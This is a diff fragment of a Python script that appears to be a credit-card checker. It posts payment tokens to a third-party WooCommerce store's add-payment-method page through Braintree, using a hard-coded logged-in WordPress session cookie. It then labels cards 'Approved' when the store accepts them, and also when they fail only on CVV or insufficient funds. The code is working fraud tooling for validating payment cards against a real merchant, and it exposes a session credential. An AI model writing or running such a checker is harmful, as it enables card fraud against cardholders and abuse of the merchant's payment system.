+                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-07-16%2020%3A39%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Frchtolive.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-07-16%2020%3A39%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Frchtolive.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F150.0.0.0%20Safari%2F537.36; mtk_src_trk=%7B%22type%22%3A%22typein%22%2C%22url%22%3A%22(none)%22%2C%22mtke%22%3A%22(none)%22%2C%22utm_campaign%22%3A%22(none)%22%2C%22utm_source%22%3A%22(direct)%22%2C%22utm_medium%22%3A%22(none)%22%2C%22utm_content%22%3A%22(none)%22%2C%22utm_id%22%3A%22(none)%22%2C%22utm_term%22%3A%22(none)%22%2C%22session_entry%22%3A%22https%3A%2F%2Frchtolive.com%2F%22%2C%22session_start_time%22%3A%222026-07-16%2020%3A39%3A00%22%2C%22session_pages%22%3A%221%22%2C%22session_count%22%3A%221%22%7D; pl_vid=eyJpZCI6IjM1NGQ0NmYxLWM3MDEtNDllYy1hYzhjLTg5ODZlY2FhMjM4ZiIsImNyZWF0ZWRBdCI6MTc4NDIzNDM0MTk4Mn0%3D; wpf_ref=%7B%22original_ref%22%3A%22https%3A%5C%2F%5C%2Frchtolive.com%5C%2Fmy-account%5C%2F%22%7D; woocommerce_recently_viewed=3493%7C12455%7C12433; wordpress_logged_in_e308604c48530797675d5ec81dc23d4f=ldfl.dsdasd-5140%7C1784410723%7CpwgCyelh2wtnw6HpQBJaxmlSuOy6sQ8s0I673XCWA7V%7Ca149bf61b7204b046a7063e3812d38161557f57a60fb4f22b1ed2c9566b8441f; sbjs_session=pgs%3D48%7C%7C%7Ccpg%3Dhttps%3A%2F%2Frchtolive.com%2Fmy-account%2Fadd-payment-method%2F',
+            }
+
+            data = [
+                ('payment_method', 'braintree_credit_card'),
+                ('wc-braintree-credit-card-card-type', 'visa'),
+                ('wc-braintree-credit-card-3d-secure-enabled', ''),
+                ('wc-braintree-credit-card-3d-secure-verified', ''),
+                ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
+                ('wc_braintree_credit_card_payment_nonce', token),
+                ('wc_braintree_device_data', '{"correlation_id":"2ad7096e-abc0-491f-b74f-d8426436"}'),
+                ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
+                ('wc_braintree_paypal_payment_nonce', ''),
+                ('wc_braintree_device_data', '{"correlation_id":"2ad7096e-abc0-491f-b74f-d8426436"}'),
+                ('wc-braintree-paypal-context', 'shortcode'),
+                ('wc_braintree_paypal_amount', '0.00'),
+                ('wc_braintree_paypal_currency', 'USD'),
+                ('wc_braintree_paypal_locale', 'en_us'),
+                ('wc-braintree-paypal-tokenize-payment-method', 'true'),
+                ('woocommerce-add-payment-method-nonce', addpayment),
+                ('_wp_http_referer', '/my-account/add-payment-method/'),
+                ('woocommerce_add_payment_method', '1'),
+            ]
+
+            response = session.post('https://rchtolive.com/my-account/add-payment-method/',  headers=headers, data=data)
+            soup = BeautifulSoup(response.text, "html.parser")
+
+            err = soup.find("div", class_="wc-block-components-notice-banner__content").get_text(strip=True)     
+            if "Nice! New payment method added" in err: 
+                return 'Approved! ✅', 'Charged $0.00'
+            elif "Status code 2010: Card Issuer Declined CVV (C2 : CVV2 DECLINED)" in err:
+                return 'Approved! ✅', err
+            elif "Status code 2001: Insufficient Funds (51 : DECLINED)" in err:
+                return 'Approved! ✅', err
+            else:
+                return 'Declined ❌', err
+        except:return 'Declined ❌', 'Unknown Error'
